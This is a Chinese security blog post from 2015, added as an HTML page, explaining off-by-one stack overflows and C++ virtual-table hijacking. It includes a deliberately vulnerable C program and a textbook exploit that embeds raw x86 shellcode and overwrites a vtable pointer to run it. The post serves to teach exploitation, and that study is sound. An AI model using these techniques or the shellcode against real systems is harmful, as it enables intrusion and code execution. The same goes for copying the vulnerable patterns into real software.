@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>对 Off by one Overflow 与 攻击 C++虚函数的理解 | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Off by one Overflow与常规的溢出不同，Off by one 只溢出一个字节，刚好可以突破 buffer 边界，大多数情况下并不是严重问题。但如果缓冲区后面跟着 EBP 和返回地址时，溢出的一个字节导致我们『部分』地控制 EBP（EBP 最低位），如果可以让 EBP 落入缓冲区中就可以控制 EIP，进而劫持进程。一字节溢出常出现的场景包括：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对 Off by one Overflow 与 攻击 C++虚函数的理解">
+<meta property="og:url" content="http://sh3ll.me/2015/08/11/offbyone-and-cpp-virtual-function/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="Off by one Overflow与常规的溢出不同，Off by one 只溢出一个字节，刚好可以突破 buffer 边界，大多数情况下并不是严重问题。但如果缓冲区后面跟着 EBP 和返回地址时，溢出的一个字节导致我们『部分』地控制 EBP（EBP 最低位），如果可以让 EBP 落入缓冲区中就可以控制 EIP，进而劫持进程。一字节溢出常出现的场景包括：">
+<meta property="og:image" content="http://sh3ll.me/images/2015/08/11/cpp-virtual-function-1.png">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="对 Off by one Overflow 与 攻击 C++虚函数的理解">
+<meta name="twitter:description" content="Off by one Overflow与常规的溢出不同，Off by one 只溢出一个字节，刚好可以突破 buffer 边界，大多数情况下并不是严重问题。但如果缓冲区后面跟着 EBP 和返回地址时，溢出的一个字节导致我们『部分』地控制 EBP（EBP 最低位），如果可以让 EBP 落入缓冲区中就可以控制 EIP，进而劫持进程。一字节溢出常出现的场景包括：">
+<meta name="twitter:image" content="http://sh3ll.me/images/2015/08/11/cpp-virtual-function-1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-offbyone-and-cpp-virtual-function" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      对 Off by one Overflow 与 攻击 C++虚函数的理解
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2015-08-11T13:44:07.000Z" itemprop="datePublished">08-11-2015</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Exploit/">Exploit</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Off-by-one-Overflow"><a href="#Off-by-one-Overflow" class="headerlink" title="Off by one Overflow"></a>Off by one Overflow</h2><p>与常规的溢出不同，Off by one 只溢出一个字节，刚好可以突破 buffer 边界，大多数情况下并不是严重问题。但如果缓冲区后面跟着 EBP 和返回地址时，溢出的一个字节导致我们『部分』地控制 EBP（EBP 最低位），如果可以让 EBP 落入缓冲区中就可以控制 EIP，进而劫持进程。<br>一字节溢出常出现的场景包括：<a id="more"></a></p>
+<ul>
+<li>字符串 00 结束符</li>
+<li>while (i &lt;= max) …</li>
+<li>for (i=0; i&lt;=max; i++) …<br>类似如下代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">//vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">void foo(char* arg);</div><div class="line">void bar(char* arg);</div><div class="line"></div><div class="line">void foo(char* arg) &#123;</div><div class="line">	bar(arg); </div><div class="line">&#125;</div><div class="line"></div><div class="line">void bar(char* arg) &#123;</div><div class="line">	char buf[256];</div><div class="line">	strcpy(buf, arg); </div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line">	if(strlen(argv[1])&gt;256) &#123; </div><div class="line">		printf(&quot;Attempted Buffer Overflow\n&quot;);</div><div class="line">		fflush(stdout);</div><div class="line">		return -1;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	foo(argv[1]); </div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>虽然代码中对输入长度进行判断，但若输入”AAAAA”（256个 A），刚好可以通过该判断，字符串结束符『\x00』会覆盖 EBP 的最低位，如果覆盖后的 EBP 指向我们的 buffer中，便可以劫持进程（Windows XP SP3上未复现）。</p>
+<h2 id="攻击-C-虚函数"><a href="#攻击-C-虚函数" class="headerlink" title="攻击 C++ 虚函数"></a>攻击 C++ 虚函数</h2><p>《C Primer Plus》只看了一点就扔下了，导致这里开始完全不懂，Google 了些资料后了解了其用法及机制。</p>
+<blockquote>
+<p>C++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。比如：模板技术，RTTI技术，虚函数技术，要么是试图做到在编译时决议，要么试图做到运行时决议。<br>对C++ 了解的人都应该知道虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V-Table。在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。这样，在有虚函数的类的实例中这个表被分配在了这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。<br>C++的编译器应该是保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证取到虚函数表的有最高的性能——如果有多层继承或是多重继承的情况下）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。</p>
+</blockquote>
+<p>结合如下代码便可以理解其机制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#include &lt;iostream&gt;</div><div class="line"></div><div class="line">using namespace std;</div><div class="line"></div><div class="line">class Base &#123;</div><div class="line">     public:</div><div class="line">            virtual void f() &#123; cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; &#125;</div><div class="line">            virtual void g() &#123; cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; &#125;</div><div class="line">            virtual void h() &#123; cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; &#125;</div><div class="line"> </div><div class="line">&#125;;</div><div class="line"></div><div class="line">typedef void(*Fun)(void);</div><div class="line"> </div><div class="line">int main() &#123;</div><div class="line">	Base b;</div><div class="line"></div><div class="line">	Fun pFun = NULL;</div><div class="line"></div><div class="line">	cout &lt;&lt; &quot;虚表指针保存在：&quot; &lt;&lt; (int*)(&amp;b) &lt;&lt; endl;</div><div class="line">	cout &lt;&lt; &quot;虚表指针指向：&quot; &lt;&lt; (int*)*(int*)(&amp;b) &lt;&lt; endl;</div><div class="line">	cout &lt;&lt; &quot;第一个虚函数入口地址：&quot; &lt;&lt; (int *)*((int*)*(int*)(&amp;b)) &lt;&lt; endl;</div><div class="line"></div><div class="line">	// Invoke the first virtual function </div><div class="line">	pFun = (Fun)*((int*)*(int*)(&amp;b));</div><div class="line">	pFun();</div><div class="line"></div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>调试如图：<br><img src="/images/2015/08/11/cpp-virtual-function-1.png" alt="图 1"><br>如果对象实例的内存空间中成员变量发生了溢出，有机会修改对象中的虚表指针或修改虚表中的虚函数指针，那么在程序调用虚函数时就会去执行 shellcode。<br>参考《0day 安全：软件漏洞分析技术》书中的例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;iostream.h&quot;</div><div class="line"></div><div class="line">char shellcode[]=</div><div class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</div><div class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</div><div class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</div><div class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</div><div class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</div><div class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</div><div class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</div><div class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</div><div class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</div><div class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</div><div class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</div><div class="line">&quot;\x1C\x88\x40\x00&quot;;//set fake virtual function pointer</div><div class="line"></div><div class="line">class Failwest</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	char buf[200];</div><div class="line">	virtual void test(void)</div><div class="line">	&#123;</div><div class="line">		cout&lt;&lt;&quot;Class Vtable::test()&quot;&lt;&lt;endl;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line">Failwest overflow, *p;</div><div class="line">void main(void)</div><div class="line">&#123;</div><div class="line">	char * p_vtable;</div><div class="line">	p_vtable=overflow.buf-4;</div><div class="line">	//__asm int 3</div><div class="line">	//reset fake virtual table to 0x004088cc</div><div class="line">	//the address may need to ajusted via runtime debug</div><div class="line">	p_vtable[0]=0xCC;</div><div class="line">	p_vtable[1]=0x88;</div><div class="line">	p_vtable[2]=0x40;</div><div class="line">	p_vtable[3]=0x00;</div><div class="line">	strcpy(overflow.buf,shellcode);//set fake virtual function pointer</div><div class="line">	p=&amp;overflow;</div><div class="line">	p-&gt;test();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>修改虚表指针指向缓冲区    =&gt; 程序按照伪造的指针去寻找虚表 =&gt; 伪造虚函数指针 =&gt; 程序调用虚函数执行 shellcode</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li>《0day 安全：软件漏洞分析技术》</li>
+<li><a href="http://blog.csdn.net/haoel/article/details/1948051" target="_blank" rel="external">C++ 虚函数表解析</a></li>
+<li><a href="http://users.own-hero.net/~decoder/offbyone.pdf" target="_blank" rel="external">Off-by-one Overflow</a></li>
+<li><a href="https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/" target="_blank" rel="external">Off-By-One Vulnerability (Stack Based)</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2015/08/11/offbyone-and-cpp-virtual-function/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2015/09/03/bypass-av-with-exploit/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          通过溢出漏洞绕过杀毒防护
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/08/09/seh/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">S.E.H</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2015/08/11/offbyone-and-cpp-virtual-function/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
